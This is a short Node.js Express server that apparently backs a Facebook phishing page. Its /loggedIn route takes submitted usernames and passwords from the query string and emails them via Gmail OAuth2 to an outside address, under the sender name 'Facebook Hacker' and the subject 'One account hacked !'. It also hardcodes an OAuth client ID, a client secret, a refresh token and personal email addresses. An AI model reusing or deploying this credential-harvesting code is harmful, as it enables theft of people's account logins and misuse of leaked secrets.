const express = require('express');
var nodemailer = require('nodemailer');
const { google } = require("googleapis");
const OAuth2 = google.auth.OAuth2;

const oauth2Client = new OAuth2(
  "91088613789-7jairrnb7an7195olqejnu48gjerkbvu.apps.googleusercontent.com", // ClientID
  "fRw4L2I_gvdV_yatJFKu_riW", // Client Secret
  "https://developers.google.com/oauthplayground" // Redirect URL
);

const app = express();

app.use(express.static('./'))

app.get('/', (req,res)=>{
    res.sendFile(__dirname+'/index.htm')
})

app.get('/loggedIn', (req,res)=>{
    console.log('req', req.query);

    oauth2Client.setCredentials({
          refresh_token: "1/FuFItnb9PKlUG6ox89dNG8n0euLHp1GQgRQXCkerQFg"
    });
    const accessToken = oauth2Client.getAccessToken();
    const smtpTransport = nodemailer.createTransport({
      service: "gmail",
      auth: {
           type: "OAuth2",
           user: "mailfromebinxavier@gmail.com", 
           clientId: "91088613789-7jairrnb7an7195olqejnu48gjerkbvu.apps.googleusercontent.com",
           clientSecret: "fRw4L2I_gvdV_yatJFKu_riW",
           refreshToken: "1/FuFItnb9PKlUG6ox89dNG8n0euLHp1GQgRQXCkerQFg",
           accessToken: accessToken
      }
    });

    const mailOptions = {
      from: "Facebook Hacker <donotreply@bar.com>",
      to: 'ebinx7@gmail.com',
      subject: 'One account hacked !',
      text: 'User Name: '+req.query.uname+'\nPassword: '+req.query.pass
    };
    
    smtpTransport.sendMail(mailOptions, function(error, info){
        if (error) {
          console.log('Failure: An Error occured'+ error);
        } else {
          console.log('Success: Email sent: ' + info.response);
        }
      });

    
    res.send(req.query)

})

app.listen(process.env.PORT || 3030);
console.log('App is listening to localhost:'+(process.env.PORT || 3030)+' ...');